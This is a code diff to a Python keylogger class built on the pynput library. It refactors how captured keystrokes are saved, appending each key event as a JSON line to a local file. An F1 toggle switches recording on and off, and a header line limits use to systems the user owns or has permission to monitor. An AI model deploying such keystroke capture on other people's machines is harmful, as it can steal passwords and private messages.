@@ -10,9 +10,11 @@ Only use on systems you own or have permission to monitor
 from dataclasses import dataclass
 from datetime import datetime, timezone
 from enum import Enum, auto
+import json
+from pathlib import Path
 
 from pynput import keyboard
-from pynput.keyboard import Key
+from pynput.keyboard import Key , KeyCode
 
 class KeyType(Enum):
     CHAR = auto()
@@ -51,7 +53,8 @@ class keylogger:
     def __init__(self):
         self.recording=False
         self.toggle_key=Key.f1
-        self.keyFile="keyfile.jsonl"
+        self.keyFile=Path("keyfile.jsonl")
+        self.last_event: KeyEvent | None = None
 
     
     def _process_key(self, key: Key | KeyCode) -> tuple[str, KeyType]:
@@ -101,8 +104,18 @@ class keylogger:
             key=key,
             key_type=key_type,
         )
+    
+    def _write_event_jsonl(self, event: KeyEvent) -> None:
+        path = Path(self.keyFile)
+        path.parent.mkdir(parents=True, exist_ok=True)
 
-    def keyPressed(self, key):
+        with path.open("a", encoding="utf-8", newline="") as file:
+            json.dump(event.to_dict(), file, ensure_ascii=False)
+            file.write("\n")
+
+
+
+    def keyPressed(self, key: Key | KeyCode) -> None:
     
         if key == self.toggle_key:
             state=self.toggle()
@@ -113,10 +126,13 @@ class keylogger:
             return
 
 
-        print(str(key))
-        with open(self.keyFile, 'a') as logKey:
-            label, key_type = self._process_key(key)
-            event = self.build_event(label, key_type)
+        print(str(key))# prints the characters for testing
+    
+        label, key_type = self._process_key(key)
+        event = self.build_event(label, key_type)
+        self._write_event_jsonl(event)
+        self.last_event = event
+        
 
 if __name__ == "__main__":
         logger= keylogger()
